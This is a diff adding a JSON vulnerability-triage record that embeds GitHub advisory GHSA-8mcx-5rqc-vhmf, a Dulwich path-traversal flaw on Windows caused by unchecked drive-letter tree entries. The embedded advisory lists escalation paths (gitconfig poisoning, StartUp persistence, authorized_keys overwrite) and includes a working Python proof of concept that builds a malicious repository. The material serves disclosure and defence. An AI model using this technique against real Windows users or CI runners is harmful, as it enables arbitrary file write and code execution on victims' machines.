@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 0, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/170020125?v=4\", \"events_url\": \"https://api.github.com/users/LukeBanto/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/LukeBanto/followers\", \"following_url\": \"https://api.github.com/users/LukeBanto/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/LukeBanto/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/LukeBanto\", \"id\": 170020125, \"login\": \"LukeBanto\", \"node_id\": \"U_kgDOCiJNHQ\", \"organizations_url\": \"https://api.github.com/users/LukeBanto/orgs\", \"received_events_url\": \"https://api.github.com/users/LukeBanto/received_events\", \"repos_url\": \"https://api.github.com/users/LukeBanto/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/LukeBanto/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/LukeBanto/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/LukeBanto\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/49032?v=4\", \"events_url\": \"https://api.github.com/users/jelmer/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/jelmer/followers\", \"following_url\": \"https://api.github.com/users/jelmer/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/jelmer/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/jelmer\", \"id\": 49032, \"login\": \"jelmer\", \"node_id\": \"MDQ6VXNlcjQ5MDMy\", \"organizations_url\": \"https://api.github.com/users/jelmer/orgs\", \"received_events_url\": \"https://api.github.com/users/jelmer/received_events\", \"repos_url\": \"https://api.github.com/users/jelmer/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/jelmer/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/jelmer/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/jelmer\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Affected files\\n* `dulwich/index.py` (Methods: `validate_path_element_ntfs`, `_tree_to_fs_path`)\\n* `dulwich/porcelain/__init__.py` (Method: `_checked_worktree_path`)\\n\\n### Description / Summary\\nA High-severity Path Traversal vulnerability exists in Dulwich's checkout logic when running on Windows. The functions responsible for validating NTFS paths strictly reject `.git` variants, Alternate Data Streams (ADS), `git~1` short names, and reserved device names, but they completely fail to check for **DOS drive letter prefixes**.\\n\\nA malicious Git tree can contain an entry named `C:`. When Dulwich processes this tree on a Windows client, the string passes the `validate_path_element_ntfs` check. Later, `_tree_to_fs_path` passes this path to `os.path.join(root, b\\\"C:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\...\\\")`. \\n\\nOn Windows, if the second argument to `os.path.join` contains an absolute drive letter, the `root` path is completely discarded. As a result, Dulwich writes the repository file to the absolute path outside of the intended Git worktree.\\n\\nWhile the standard C `git` client explicitly blocks this via `has_dos_drive_prefix()` in `path.c`, Dulwich lacks this protection. Because Git trees are cross-platform, an attacker can author a malicious repository on Linux and wait for a Windows victim (or CI runner) to clone it.\\n\\n### Potential impact\\n\\nThis vulnerability allows an attacker to achieve **Arbitrary File Write**, which can trivially be escalated to **Remote Code Execution (RCE)** or total system compromise on the victim's Windows machine.\\n\\nAttack vectors include:\\n1. **Git Config Poisoning (RCE):** Writing a malicious `C:\\\\\\\\Users\\\\\\\\<victim>\\\\\\\\.gitconfig` file to set `core.sshCommand` to an arbitrary executable, granting RCE the next time the user interacts with Git.\\n2. **Persistence (RCE):** Dropping a malicious executable into `C:\\\\\\\\ProgramData\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\`.\\n3. **SSH Key Overwrite:** Writing to `C:\\\\\\\\Users\\\\\\\\<victim>\\\\\\\\.ssh\\\\\\\\authorized_keys` to compromise remote servers accessible by the victim.\\n4. **CI/CD Compromise:** If a Windows-based CI/CD runner (e.g., GitHub Actions) automatically clones a malicious pull request, the runner is instantly compromised, potentially leaking repository secrets.\\n\\n### Proof of Concept (PoC)\\nThe following Python script (runnable on Linux) generates a malicious Git repository containing a payload that targets Windows clients.\\n\\n```python\\nfrom dulwich.objects import Blob, Tree, Commit\\nfrom dulwich.repo import Repo\\nimport os, tempfile\\n\\nrepo_path = tempfile.mkdtemp()\\nrepo = Repo.init(repo_path)\\n\\n# 1. Build the payload blob.\\nblob = Blob(); blob.data = b\\\"pwned-by-drive-letter\\\\\\\\n\\\"\\nrepo.object_store.add_object(blob)\\n\\n# 2. Build the malicious tree hierarchy: C:/Users/victim/evil.txt\\nevil_txt = Tree();   evil_txt[b\\\"evil.txt\\\"] = (0o100644, blob.id)\\nrepo.object_store.add_object(evil_txt)\\nvictim_dir = Tree(); victim_dir[b\\\"victim\\\"] = (0o040000, evil_txt.id)\\nrepo.object_store.add_object(victim_dir)\\nusers_dir  = Tree(); users_dir[b\\\"Users\\\"]   = (0o040000, victim_dir.id)\\nrepo.object_store.add_object(users_dir)\\n\\n# VULNERABILITY: The \\\"C:\\\" directory bypasses validation\\nc_drive    = Tree(); c_drive[b\\\"C:\\\"]        = (0o040000, users_dir.id)\\nrepo.object_store.add_object(c_drive)\\n\\ncommit = Commit()\\ncommit.tree = c_drive.id\\ncommit.message = b\\\"add feature\\\"\\ncommit.author = commit.committer = b\\\"attacker <a@evil.example>\\\"\\ncommit.author_time = commit.commit_time = 1700000000\\ncommit.author_timezone = commit.committer_timezone = 0\\nrepo.object_store.add_object(commit)\\nrepo.refs[b\\\"refs/heads/main\\\"] = commit.id\\n\\nprint(f\\\"Malicious repo created at {repo_path}\\\")\\nprint(f\\\"Clone with: dulwich clone {repo_path} /target/win/worktree\\\")\\n# Result: A Windows checkout of this commit writes the payload directly to C:\\\\\\\\Users\\\\\\\\victim\\\\\\\\evil.txt\\n```\", \"ghsa_id\": \"GHSA-8mcx-5rqc-vhmf\", \"github_reviewed_at\": \"2026-10-02T19:14:21Z\", \"html_url\": \"https://github.com/advisories/GHSA-8mcx-5rqc-vhmf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8mcx-5rqc-vhmf\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-02T19:14:21Z\", \"references\": [\"https://github.com/jelmer/dulwich/security/advisories/GHSA-8mcx-5rqc-vhmf\", \"https://github.com/jelmer/dulwich/commit/4ca77f9f470742ba246cd6fa07beb6d735045664\", \"https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.9\", \"https://github.com/advisories/GHSA-8mcx-5rqc-vhmf\"], \"repository_advisory_url\": \"https://api.github.com/repos/jelmer/dulwich/security-advisories/GHSA-8mcx-5rqc-vhmf\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/jelmer/dulwich\", \"summary\": \"Dulwich: Arbitrary File Write (RCE) on Windows via Unvalidated Drive Letters in Tree Paths\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-02T19:14:22Z\", \"url\": \"https://api.github.com/advisories/GHSA-8mcx-5rqc-vhmf\", \"vulnerabilities\": [{\"first_patched_version\": \"1.2.9\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"dulwich\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.2.9\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8mcx-5rqc-vhmf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "dulwich: < 1.2.9"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "dulwich"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-03T19:59:33.347471Z",
+  "provenance": {
+    "content_sha256": "7c9efdc72a14e12ddecd118862540725adbef3415e627304e87fd5e64802d813",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-02T19:14:21Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8mcx-5rqc-vhmf",
+  "status": "active",
+  "title": "Dulwich: Arbitrary File Write (RCE) on Windows via Unvalidated Drive Letters in Tree Paths",
+  "updated_at": "2026-10-02T19:14:22Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8mcx-5rqc-vhmf"
+}
